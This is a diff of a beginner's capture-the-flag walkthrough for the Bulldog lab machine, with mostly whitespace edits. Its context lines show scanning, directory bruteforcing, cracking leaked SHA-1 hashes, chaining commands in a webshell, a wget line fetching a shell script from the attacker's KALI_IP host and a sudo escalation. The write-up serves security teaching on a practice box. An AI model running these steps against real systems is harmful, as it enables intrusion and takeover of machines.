@@ -1,4 +1,4 @@
-[Main Page](index.md)
+[Main Page](index.md)<br>
 
 
 # From "What are CTF's?" to Your First Owned System
@@ -11,7 +11,7 @@
 ### 23 January 2018
 
 
-## Before We Start 
+## Before We Start
 
 __Make sure you have set up your system according to the instructions in [*Part One!*](FirstCTF_1of2_InfoAndSetup.html)__
 
@@ -117,7 +117,7 @@ Let's run the first command of the pentest.
 
 `nmap` is able to read the unique hardware address of each device found.
 It can look up the first parts of these addresses to associate each device with a possible manufacturer.
-In our case, we get two boxes with a network interface "manufactured by" VirtualBox. 
+In our case, we get two boxes with a network interface "manufactured by" VirtualBox.
 
 
 Since we only have two hits from VirtualBox machines, and we know our machine's IP, we know which one is Bulldog.
@@ -215,7 +215,7 @@ Viewing the sources on the pages is possible, but nothing there jumps out at us 
 
 There is a way for us to dig into this website a bit deeper.
 
-### Directory Bruteforcing 
+### Directory Bruteforcing
 
 We suspect there is more to this website than the 2 pages we have seen, but we haven't found any links to take us anywhere else.<br>
 There might be some pages like /mail, /login, or other common names, but we don't want to just type them in manually in the browser.
@@ -227,7 +227,7 @@ We can feed it different flags in order to do things like dig deeper, look for e
 `dirb http://bulldog.ctf -r | tee dirb_result.txt`
 
 
-The `-r` flag tells dirb __NOT__ to search recursively. 
+The `-r` flag tells dirb __NOT__ to search recursively.
 When you do your own CTFs, you may not want to enable this option, but we will use it here to demonstrate our process while keeping things light.<br>
 If we wanted to, we could specify a wordlist for `dirb` to use, but the defaul will serve our needs just fine.
 
@@ -244,7 +244,7 @@ We get 3 hits - `/admin`, `/dev`, `/robots.txt`
 Let's start with `/robots.txt` - since that might contain the names of some restricted areas. <br>
 Ideally, a `robots.txt` file forbids certain webcrawlers from accessing the pages they list. <br>
 This might prevent a program like `dirb` from getting a complete result.
- 
+
 However, if we know there is a `robots.txt`, we can simply visit it in the browser and read the entries with our eyeballs.
 
 <br>
@@ -263,7 +263,7 @@ What does  `/admin` have to offer?
 
 This page's gives us two key pieces of information just by existing:
 * The site can be logged into - giving us a possible avenue of attack
-* "Django" is a potentially useful term 
+* "Django" is a potentially useful term
 
 Even if you don't know what Django means in this context, useful terms like this may lead to productive searches in the future.
 
@@ -273,7 +273,7 @@ So far, my (somewhat limited) experience has shown that reconnaissance should fo
 
 
 <br>
-![A9](https://i.imgur.com/qzmkELJ.png) 
+![A9](https://i.imgur.com/qzmkELJ.png)
 
 ![A10](https://i.imgur.com/A5fuPXu.png)
 <br>
@@ -312,7 +312,7 @@ Not only do we have a listing of contacts for each member of the company, but we
 
 ### What are hashes?
 
-Hashes are similar to, but are not encryption. 
+Hashes are similar to, but are not encryption.
 When a user logs in to a system, the system will check their credentials against its database to see if the password is correct.
 However, instead of storing the passwords in plaintext, the system stores them as "hashes."
 To better explain this, we are going to use encryption as an analogy for hashing.
@@ -341,8 +341,8 @@ md5 hashes are always the same length, no matter how long the plaintext is. <br>
 As nice as md5 sounds, it is considered obsolete and vulnerable to dictionary and side channel attacks.<br>
 Unfortunately, it might be the most popular hashing algorithm in use today, in addition to SHA-1.
 
-<br> 
- 
+<br>
+
 ### How are hashes used in the login process?
 
 When a user enters in a password string, the system runs the hashing algorithm and stores the result.<br>
@@ -380,7 +380,7 @@ In your Kali terminal, run `gedit` to open up the text editor.
 From the `/dev` page source, copy all lines containing hashes into the editor and save it as `raw_creds.txt` in your working directory.
 
 <br>
-![A16](https://i.imgur.com/GnuPgTY.png) 
+![A16](https://i.imgur.com/GnuPgTY.png)
 <br>
 
 Close gedit - we are going to clean up our text from the terminal.
@@ -388,7 +388,7 @@ Close gedit - we are going to clean up our text from the terminal.
 Our credentials file must be in `user:hash` format in order for our Dictionary Attack tool to make use of it.
 
 For the sake of time, I am going to show you a quick method of achieving this result from the command line based on the `cut` `paste` and `tr` commands.<br>
-If you'd like to understand these commands better, you can check out their `man` pages. 
+If you'd like to understand these commands better, you can check out their `man` pages.
 
 * `cut` separates lines of text into columns based on a chosen character.
 * `paste` takes lines from two text files and creates a single file of two columns - one column from each file.
@@ -429,7 +429,7 @@ Copy one of the hashes, and then paste it into the hash identifying command `has
 ![A20](https://i.imgur.com/BWaysZi.png)
 <br>
 
-`hashid` tells us that our hashes are most likely SHA-1.<br> 
+`hashid` tells us that our hashes are most likely SHA-1.<br>
 This is one of the easier hashes to crack, and is about as old and insecure as md5.<br>
 Let's introduce our file to our friend John.
 
@@ -533,7 +533,7 @@ Let's try something unapproved, like `id`,  or `cd`
 In the webshell, run  `pwd && id && cd /tmp && pwd`
 
 `/tmp` is a useful directory since all users have access to it by default.<br>
-It is a great place for us to set up camp on the target system. 
+It is a great place for us to set up camp on the target system.
 
 <br>
 ![A26.5](https://i.imgur.com/aBLA3YX.png)
@@ -614,7 +614,7 @@ We will need to break our command down into parts:
 *	`wget  http://KALI_IP:1234/script.sh` to download to that directory
 *	`chmod +x script.sh` to make the script executable
 
-Run this in the webshell: 
+Run this in the webshell:
 `pwd && cd /tmp && wget http://KALI_IP:1234/script.sh && chmod +x script.sh`
 
 <br>
@@ -679,7 +679,7 @@ This shell can be upgraded, but we will only be doing that a little bit later on
 For this box, we can get by with a very primitive shell.
 
 <br>
-If you stop a process with `CTRL-C` - the shell is stopped instead.<br> 
+If you stop a process with `CTRL-C` - the shell is stopped instead.<br>
 __If you need to restart your shell, simply repeat steps 4 and 5 of our shell process__
 <br>
 
@@ -723,14 +723,14 @@ Empty? That cant be. Perhaps the files are hidden?
 
 
 All of the files in this directory are hidden! <br>
-Most of them are configuration files found in every user's folder by default, but not `.hiddenadmindirectory` <br> 
+Most of them are configuration files found in every user's folder by default, but not `.hiddenadmindirectory` <br>
 This folder is calling to us to take a closer look - let's have a look.
 
 
-A period at the beginning of a file denotes a file is hidden, but it is also part of its name. If we want to enter this directory, all we need to do is include the period in our command. 
+A period at the beginning of a file denotes a file is hidden, but it is also part of its name. If we want to enter this directory, all we need to do is include the period in our command.
 
 Enter this folder and list its contents - making sure we look for more hidden files.
- 
+
 
 
 * `cd /home/bulldogadmin/.hiddenadmindirectory && ls -a`
@@ -757,7 +757,7 @@ Maybe we can reverse engineer this `customPermissionApp` and find something usef
 ## 6. Reversing to Root
 
 Reverse engineering can be a complicated process that would normally exceed the scope of this document.
-But there are a few simple steps we can try that might be productive. 
+But there are a few simple steps we can try that might be productive.
 
 
 The `customPermissionApp` isn't a text file, but is likely a compiled program.
@@ -770,14 +770,14 @@ This file might be pretty long, however, so we should pipe it to the `less` comm
 Unfortunately, our shell is too primitive at this stage to use `less`
 
 We need what is called a `tty` which allows for more interactivity. <br>
-A reliable way of getting a `tty` uses python, which we know our system is running from way back when we did our `nmap` scans. 
+A reliable way of getting a `tty` uses python, which we know our system is running from way back when we did our `nmap` scans.
 
 
 * `python -c 'import pty;pty.spawn("/bin/bash")`
 
 
 This may throw out an error, but will still work.
-The error comes from the `/bin/bash` part of our command, and is the same as the error we saw when we started the reverse shell. 
+The error comes from the `/bin/bash` part of our command, and is the same as the error we saw when we started the reverse shell.
 
 <br>
 ![A36](https://i.imgur.com/iTMMcUA.png)
@@ -801,13 +801,13 @@ We have have isolated all the easily read characters, so let's see if anything j
 The first thing I noticed was `sudo su root` at the bottom.<br>
 If a user is set up as superuser, and runs this command, the system asks for their password, and then switches the terminal from user shell to a `root` shell. <br>
 Note that the system does not ask for the `root` password to upgrade a shell from user to root, but merely the superuser's password.<br> `sudo su` doesn't run a single command as root, but __*logs in*__ as root.<br>
-This is exactly what we want to achieve. 
+This is exactly what we want to achieve.
 
 
 We know that `sudo su` requires a password, but look at this line from the application:<br>
 
 
-`Usage: ./customPermissionApp <username>"` 
+`Usage: ./customPermissionApp <username>"`
 
 
 The application doesn't appear to __ask__ for a password, does it? <br>
@@ -816,7 +816,7 @@ Could this mean that the password for the Django user is hard-coded into the pas
 
 
 We should read the whole file to try to find something.<br>
-Start with the section we are already looking at. 
+Start with the section we are already looking at.
 
 <br>
 ![A38 - supergood](https://i.imgur.com/wwMLiix.png)
@@ -837,7 +837,7 @@ You know, if you dropped those pesky H's at the end, you would find<br>
 
 Could this be our "hidden" password?<br>
 
-Let's try it! 
+Let's try it!
 
 * `sudo su`
 
@@ -853,7 +853,7 @@ We have access to all files, can change any passwords, install backdoors, and ru
 
 If this were a real pentest, we may attempt to cover our tracks or use this box as a staging ground for accessing other machines on a network.<br> A hacker might use this machine to serve their botnet, or as a proxy to commit actions that may be traced back to Bulldog Industries.
 
- 
+
 All we want to do, however, is grab the flag from the `/root` directory.
 
 
@@ -864,12 +864,12 @@ All we want to do, however, is grab the flag from the `/root` directory.
 
 ## Conclusion
 
-If you want to get into more CTFs, I recommend [Vulnhub](https://www.vulnhub.com) and [HackTheBox](https://www.hackthebox.eu) as great platforms. 
+If you want to get into more CTFs, I recommend [Vulnhub](https://www.vulnhub.com) and [HackTheBox](https://www.hackthebox.eu) as great platforms.
 
 Vulnhub maintains [this list of resources](https://www.vulnhub.com/resources/) which may serve as your launchpad for all things security.
 
 CTFs are a fun way of testing your problem solving ability, learning a ton, and developing a skill that can blossom into a new career in cybersecurity.<br>
-Most importantly, they will help you develop the CTF __*MINDSET*__.<br> 
+Most importantly, they will help you develop the CTF __*MINDSET*__.<br>
 
 This mindset is prevalent throughout the pentesting community and will be one of your greatest assets.
 
@@ -877,7 +877,7 @@ This mindset is prevalent throughout the pentesting community and will be one of
 Here are a few pieces of this mindset:
 * *Try harder* - This is the official advice of the OSCP Pentesting Certification
 * Be self-reliant. CTF writeups are one of the ONLY places you will be spoon fed ideas on how to move forward. If you approach a community of pentesters without showing your own independent efforts, there is an excellent chance you will simply be shown the door.
-* If you don't know something, learn it. Search online, read some books, watch some tutorials and try again. 
+* If you don't know something, learn it. Search online, read some books, watch some tutorials and try again.
 * "How is this intended to be used? How can I do something unexpected?"
 * "What would happen if I..."
 
@@ -885,3 +885,6 @@ Here are a few pieces of this mindset:
 I hope you had fun capturing your first flag!<br>
 
 
+
+<br>
+[Main Page](index.md)
